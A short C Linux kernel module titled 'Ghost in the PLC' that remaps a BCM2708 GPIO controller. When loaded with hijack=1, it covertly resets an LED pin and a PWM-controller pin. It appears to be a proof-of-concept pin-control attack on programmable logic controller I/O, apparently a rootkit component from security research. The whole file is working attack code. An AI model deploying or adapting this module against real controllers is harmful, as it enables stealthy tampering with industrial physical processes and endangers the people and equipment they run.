/*
 * Usage: insmod reset.ko hijack=int
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/io.h>

static int hijack = 0;
volatile unsigned* gpio = 0x00;
int g1 = 22; // Pin 22 attached to LED
int g2 = 2; // Pin 2 (controlled by I2C) attached to Adafruit PWM controller

module_param(hijack, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(hijack, "Hijack the control"); // 1=Yes, 0=No

#define BCM2708_PERI_BASE        0x20000000
#define GPIO_BASE                (BCM2708_PERI_BASE + 0x200000) /* GPIO controller */
#define BLOCK_SIZE 4096

#define INP_GPIO(g) *(gpio+((g)/10)) &= ~(7<<(((g)%10)*3))
#define OUT_GPIO(g) *(gpio+((g)/10)) |=  (1<<(((g)%10)*3))
#define SET_GPIO_ALT(g,a) *(gpio+(((g)/10))) |= (((a)<=3?(a)+4:(a)==4?3:2)<<(((g)%10)*3))
#define GPIO_SET *(gpio+7)
#define GPIO_CLR *(gpio+10)
#define GET_GPIO(g) (*(gpio+13)&(1<<g))
#define GPIO_PULL *(gpio+37)
#define GPIO_PULLCLK0 *(gpio+38)

static int __init hw_break_module_init(void) {

	printk(KERN_INFO "[RK] init\n");

	gpio = ioremap(GPIO_BASE, BLOCK_SIZE); // GPIO base remapped

	printk(KERN_INFO "[RK] Remapped GPIO Base address: %x %lu\n", (unsigned)gpio, (long)gpio);
	printk(KERN_INFO "[RK] Hijack: %d\n", hijack);

	if (hijack == 1) {
		INP_GPIO(g1);
		INP_GPIO(g2);
		OUT_GPIO(g1); // Reset LED pin as output
		SET_GPIO_ALT(g2, 0); // Reset PWM pin as alternate function 0
	}

	return 0;

}

static void __exit hw_break_module_exit(void) {
	iounmap(gpio);
	printk(KERN_INFO "[DR] exit\n");
}

module_init(hw_break_module_init);
module_exit(hw_break_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("cl0wn & bl4ckic3");
MODULE_DESCRIPTION("Ghost in the PLC");
